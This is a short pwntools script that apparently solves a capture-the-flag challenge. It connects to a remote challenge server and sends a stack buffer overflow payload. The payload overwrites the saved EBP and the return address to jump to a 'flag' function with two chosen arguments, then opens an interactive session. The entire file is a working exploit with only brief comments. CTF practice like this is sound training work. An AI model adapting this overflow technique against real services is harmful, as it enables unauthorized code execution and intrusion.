from pwn import *

# Connect to the remote service
p = remote('revision.challenges.cybersecuritychallenge.be', 1337)

# Build the payload:
padding   = b"A" * 28            # Fill the buffer (28 bytes)
fake_ebp  = b"B" * 4             # Overwrite saved EBP (4 bytes)
flag_addr = p32(0x080491b6)       # Address of the flag function (from your analysis)
dummy_ret = p32(0x41414141)       # Dummy return address for the flag function
arg1      = p32(0xdeadbeef)       # First argument expected by flag
arg2      = p32(0xcafebabe)       # Second argument expected by flag

payload = padding + fake_ebp + flag_addr + dummy_ret + arg1 + arg2

p.sendline(payload)
p.interactive()
